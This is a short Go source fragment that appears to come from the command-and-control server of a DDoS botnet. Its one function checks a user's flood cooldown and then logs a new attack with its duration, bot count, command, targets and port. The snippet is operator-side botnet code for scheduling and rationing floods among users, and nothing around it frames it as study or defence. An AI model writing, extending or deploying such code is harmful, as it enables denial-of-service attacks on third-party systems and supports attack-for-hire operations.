...
func (this *database) can_flood(username string, duration uint32, flood_cooldown uint32, max_bots int, command string, targets string, port uint16) error {
    rows, _ := this.db.Query("SELECT timestamp, duration FROM log WHERE user = ? AND (timestamp + duration + ?) > UNIX_TIMESTAMP()", username, flood_cooldown)
    var sent, d uint32
    defer rows.Close()
    if rows.Next() {
        rows.Scan(&sent, &d)
        return errors.New(fmt.Sprintf("You already have a running flood or have a cooldown, please wait %d seconds before sending another\r\n", (sent + d + flood_cooldown) - uint32(time.Now().Unix())))
    }
    this.db.Exec("INSERT INTO log (user, duration, max_bots, command, targets, port, timestamp) VALUES (?, ?, ?, ?, ?, ?, UNIX_TIMESTAMP())", username, duration, max_bots, command, targets, port)
    return nil
}
